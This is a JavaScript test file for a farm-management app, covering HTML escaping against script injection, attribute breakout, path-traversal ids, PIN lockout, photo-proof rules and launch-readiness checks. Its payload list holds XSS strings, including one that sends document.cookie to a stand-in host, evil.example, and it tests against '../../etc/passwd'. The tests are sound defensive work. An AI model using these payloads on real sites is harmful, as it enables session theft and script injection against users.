// Proof of work, launch readiness, and injection — requirements 6.4, 7.4,
// and the acceptance checklist in section 9.
//
// NFR-SEC-04 asks for these by name: "Tests cover script injection through
// notes and adviser links." Every field in this app is typed by somebody, and
// on a farm the person typing is not the threat model — the threat model is
// that one of them pastes something they were sent, or that text from a web
// search comes back through the adviser. Either way it ends up inside
// innerHTML, and either way it must come out as characters on a screen.

import { test } from 'node:test';
import assert from 'node:assert/strict';

const base = new URL('../web/js/', import.meta.url);
const { esc } = await import(new URL('util.js', base).href);
const kit = await import(new URL('ui/kit.js', base).href);
const { canComplete, judgePhoto, MAX_PHOTO_BYTES, PROOF_REQUIRED } =
  await import(new URL('domain/proof.js', base).href);
const { readiness, sampleDataCheck, sharedPinCheck } =
  await import(new URL('domain/readiness.js', base).href);
const { digestText } = await import(new URL('domain/digest.js', base).href);
const core = await import(new URL('../server/core.mjs', import.meta.url).href);

const TODAY = '2026-09-16';
const NOW = '2026-09-16T08:00:00.000Z';
const minutesAgo = (m) => new Date(new Date(NOW).getTime() - m * 60000).toISOString();

/** The payloads a note, a buyer name or a search result might arrive carrying. */
const PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><img src=x onerror=alert(1)>",
  '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '</textarea><script>alert(1)</script>',
  '<a href="javascript:alert(1)">tap me</a>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
];

// --- NFR-SEC-04: injection through the fields people type into ------------

test('every dangerous payload comes out of esc() as characters, not markup', () => {
  for (const payload of PAYLOADS) {
    const out = esc(payload);
    // The property that matters: not one unescaped angle bracket or quote
    // survives, so nothing in the string can open a tag or end an attribute.
    // `onerror=` as literal text between &lt; and &gt; is inert, and asserting
    // on the word rather than the brackets would be testing the wrong thing.
    assert.ok(!/[<>]/.test(out), `an angle bracket survived: ${payload}`);
    assert.ok(!/["']/.test(out), `a quote survived: ${payload}`);
    // Escaped, not stripped — the field still reads back what was typed.
    assert.ok(out.length >= payload.length, `content was dropped: ${payload}`);
  }
});

test('a scouting note carrying a script renders as text in every card helper', () => {
  // The exact route NFR-SEC-04 names: a note typed in the field, shown back on
  // a manager's screen.
  const note = 'Aphids on the edge rows <script>alert(document.cookie)</script>';

  for (const [name, html] of [
    ['cardHead', kit.cardHead(note)],
    ['badge', kit.badge(note)],
    ['note', kit.note('warn', note)],
    ['stat', kit.stat(note, '4')],
    ['field', kit.field(note, '<input>')],
    ['table', kit.table(['Finding'], [[note]])],
  ]) {
    assert.ok(!/<script/i.test(html), `${name} let a script through`);
    assert.ok(html.includes('&lt;script&gt;'), `${name} did not escape it visibly`);
  }
});

test('a buyer name with a quote cannot break out of an attribute', () => {
  const buyer = '" onmouseover="alert(1)" x="';
  const value = esc(buyer);
  const html = `<div title="${value}">sale</div>`;

  // The attribute can only be closed by a raw double quote, so that is the
  // thing to assert on. Stripping the entities first and then looking for
  // `onmouseover=` would just recreate the dangerous string by hand.
  assert.ok(!value.includes('"'), 'no raw quote survives to close the attribute');
  assert.ok(value.includes('&quot;'), 'it is escaped rather than stripped');

  // One attribute, opened and closed by the template and nothing else.
  const attributes = html.match(/[a-z-]+="/g) || [];
  assert.deepEqual(attributes, ['title="']);
});

test('escaping is not double-applied by the card helpers', () => {
  // A cosmetic bug rather than a security one, but it is how &#39; ends up on
  // screen in front of a farm manager.
  const name = "Sam's corner";
  assert.ok(kit.cardHead(name).includes('Sam&#39;s corner'));
  assert.ok(!kit.cardHead(name).includes('&amp;#39;'));
});

test('the digest carries no markup, whatever was typed into the records', () => {
  // The digest goes out by WhatsApp and SMS, so the test is not just that it is
  // safe — it is that it is plain.
  const state = {
    settings: { farmName: 'DouValue <script>alert(1)</script> Farms' },
    people: {}, plots: {}, cycles: {}, tasks: {}, inputs: {},
    harvests: [], sales: [], sprays: [], scouts: [], diagnoses: [], expenses: [],
    stockMoves: [], attendance: [], workLogs: [], weather: [], reports: [],
    soilTests: [], topsoilBatches: {}, gateOverrides: [], alertAcks: [], alertDecisions: [],
    log: [], orphans: [],
  };
  const text = digestText(state, { now: NOW });

  // The message itself is plain text: WhatsApp and SMS interpret none of it,
  // and escaping it would put &lt; in front of the Owner for no reason.
  assert.ok(!text.includes('&lt;'), 'the message is text, not HTML, so it is not escaped');
  assert.ok(!/<[a-z]+ [a-z-]+=/i.test(text), 'and it carries no attribute-bearing markup');

  // But the screen shows it inside a <pre>, and that is the path that could
  // execute, so the escaped form is what must reach the DOM.
  const rendered = `<pre class="working">${esc(text)}</pre>`;
  assert.ok(!/<script/i.test(rendered.replace(/&lt;/g, '')) || rendered.includes('&lt;script&gt;'),
    'the farm name is escaped on the way to the screen');
  assert.ok(rendered.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
});

test('the server refuses a farm id that could walk out of its own storage', () => {
  // Farm ids reach the filesystem in the Node adapter and the KV key in Deno.
  for (const bad of ['../../etc/passwd', 'a/b', 'a b', '..', 'x'.repeat(100), '']) {
    assert.equal(/^[A-Za-z0-9_-]{1,64}$/.test(bad), false, `${bad} must not be a valid farm id`);
  }
  for (const good of ['farm_01', 'DouValue-2026', 'abc123']) {
    assert.equal(/^[A-Za-z0-9_-]{1,64}$/.test(good), true);
  }
});

// --- NFR-SEC-02: the lockout ---------------------------------------------

test('five wrong PINs lock the account', () => {
  let member = { id: 'u1', failedAttempts: 0 };
  const now = Date.now();

  for (let i = 1; i <= 4; i++) {
    member = { ...member, ...core.afterFailure(member, now) };
    assert.equal(core.lockoutState(member, now).locked, false, `locked too early at ${i}`);
  }
  member = { ...member, ...core.afterFailure(member, now) };
  assert.equal(core.lockoutState(member, now).locked, true, 'the fifth try locks it');
});

test('the lock lifts by itself, rather than needing the Owner', () => {
  const now = Date.now();
  let member = { id: 'u1', failedAttempts: 0 };
  for (let i = 0; i < 5; i++) member = { ...member, ...core.afterFailure(member, now) };

  assert.equal(core.lockoutState(member, now + 60_000).locked, true, 'still locked after a minute');
  assert.equal(core.lockoutState(member, now + 16 * 60_000).locked, false, 'clear after a quarter hour');
});

// --- FR-PROOF: photos that are actually proof -----------------------------

test('a scouting task cannot be closed without a photo', () => {
  const task = { id: 't1', kind: 'scout', title: 'Check GH-01 traps' };
  const verdict = canComplete(task, null);

  assert.equal(verdict.ok, false);
  assert.equal(verdict.reason, 'missing');
  assert.match(verdict.fix, /camera/i);
});

test('a photo out of the gallery is not proof', () => {
  // FR-PROOF-02. A picture from yesterday proves the bed was fine yesterday.
  const task = { id: 't1', kind: 'trap' };
  const stale = { dataUrl: 'data:image/jpeg;base64,x', fresh: false, ageMinutes: 1440, bytes: 40000 };
  const verdict = canComplete(task, stale);

  assert.equal(verdict.ok, false);
  assert.equal(verdict.reason, 'stale');
  assert.match(verdict.why, /1440 minutes old/);
});

test('a photo taken at the bed is proof', () => {
  const task = { id: 't1', kind: 'scout' };
  const fresh = {
    dataUrl: 'data:image/jpeg;base64,x', fresh: true,
    takenAt: minutesAgo(1), ageMinutes: 1, bytes: 40000,
  };
  assert.equal(canComplete(task, fresh).ok, true);
});

test('a camera that reports no timestamp is allowed, and the record says so', () => {
  // Refusing these would block honest work on the cheapest handsets, which is
  // the opposite of the point. The absence is carried, not hidden.
  const verdict = canComplete({ kind: 'scout' }, {
    dataUrl: 'data:image/jpeg;base64,x', fresh: null, bytes: 30000,
  });

  assert.equal(verdict.ok, true);
  assert.equal(verdict.unverifiedTime, true);
});

test('a photo too big to send is refused — FR-PROOF-04', () => {
  const verdict = judgePhoto({
    dataUrl: 'data:image/jpeg;base64,x', fresh: true, bytes: MAX_PHOTO_BYTES + 1,
  });

  assert.equal(verdict.ok, false);
  assert.equal(verdict.reason, 'too-big');
});

test('ordinary tasks are not gated on a photo', () => {
  // A rule people resent is a rule they work around, so only the checks that
  // catch a pest early carry it.
  for (const kind of ['irrigate', 'prune', 'fertigate', 'harvest']) {
    assert.equal(canComplete({ kind }, null).ok, true, `${kind} should not need a photo`);
  }
  for (const kind of PROOF_REQUIRED) {
    assert.equal(canComplete({ kind }, null).ok, false, `${kind} should need one`);
  }
});

// --- NFR-SEC-01: sample data beside real data -----------------------------

const person = (id, role = 'hand', extra = {}) => ({ id, name: id, role, active: true, ...extra });

function state(overrides = {}) {
  return {
    settings: { farmName: 'DouValue Farms Limited' },
    people: {}, plots: {}, cycles: {}, tasks: {}, inputs: {},
    harvests: [], sales: [], sprays: [], scouts: [], diagnoses: [], expenses: [],
    stockMoves: [], attendance: [], workLogs: [], weather: [], reports: [],
    soilTests: [], topsoilBatches: {}, gateOverrides: [], alertAcks: [], alertDecisions: [],
    log: [], orphans: [],
    ...overrides,
  };
}

test('the sample farm on its own is fine', () => {
  const s = state({ people: { sp_a: person('sp_a'), sp_b: person('sp_b', 'ceo') } });
  const check = sampleDataCheck(s);

  assert.equal(check.ok, true);
  assert.equal(check.state, 'sample-only');
  assert.match(check.fix, /Erase it/);
});

test('sample accounts beside real records is the dangerous state, and is refused', () => {
  const s = state({
    people: { sp_a: person('sp_a'), u_real: person('u_real', 'ceo') },
    sales: [{ id: 'sale_1', date: TODAY, kg: 100, amount: 260000 }],
  });
  const check = sampleDataCheck(s);

  assert.equal(check.ok, false);
  assert.equal(check.state, 'mixed');
  assert.match(check.fix, /PIN 1234/);
  assert.deepEqual(check.samplePeople, ['sp_a']);
});

test('a real farm with no sample accounts passes', () => {
  const s = state({ people: { u_a: person('u_a', 'ceo'), u_b: person('u_b') } });
  assert.equal(sampleDataCheck(s).ok, true);
  assert.equal(sharedPinCheck(s).ok, true);
});

test('the mixed state reaches the Owner at the top of the digest', () => {
  const s = state({
    people: { sp_a: person('sp_a'), u_real: person('u_real', 'ceo') },
    sales: [{ id: 'sale_1', date: TODAY, kg: 100, amount: 260000 }],
  });
  const text = digestText(s, { now: NOW });

  assert.match(text.split('\n').find((l) => l.startsWith('!!')) || '', /SAMPLE ACCOUNTS STILL ACTIVE/);
});

// --- Section 9: the launch checklist --------------------------------------

test('the launch checklist answers itself from the records', () => {
  const s = state({ people: { u_a: person('u_a', 'ceo') } });
  const r = readiness(s, { today: TODAY, now: NOW });

  assert.ok(r.rows.length >= 8);
  assert.equal(r.ready, true, JSON.stringify(r.blocking.map((b) => b.id)));
});

test('the two rows no computer can answer say so, instead of claiming a pass', () => {
  const r = readiness(state({ people: { u_a: person('u_a', 'ceo') } }), { today: TODAY, now: NOW });
  const ids = r.unanswerable.map((x) => x.id);

  assert.deepEqual(ids.sort(), ['FR-REP-02', 'UX-26']);
  for (const row of r.unanswerable) {
    assert.equal(row.ok, null, `${row.id} must not claim a verdict`);
    assert.ok(row.detail.length > 30, `${row.id} must say why nobody can answer it here`);
  }
});

test('a farm that is not ready says exactly what is blocking', () => {
  const s = state({
    people: { sp_a: person('sp_a'), u_real: person('u_real', 'ceo') },
    plots: { gh1: { id: 'gh1', name: 'GH-01', type: 'greenhouse' } },
    cycles: { c1: { id: 'c1', plotId: 'gh1', cropId: 'bell', transplantDate: '2026-08-01', status: 'active' } },
    sprays: [{ id: 'sp1', cycleId: 'c1', productId: 'neem', date: '2026-09-10' }],
  });
  const r = readiness(s, { today: TODAY, now: NOW });
  const blocked = r.blocking.map((b) => b.id);

  assert.equal(r.ready, false);
  assert.ok(blocked.includes('NFR-SEC-01'), 'sample accounts beside real ones');
  assert.ok(blocked.includes('NFR-SEC-02'), 'the shared PIN');
  assert.ok(blocked.includes('FR-GATE-01/02'), 'planted with no soil test');
  assert.ok(blocked.includes('FR-GATE-04'), 'a spray with no diagnosis');
});
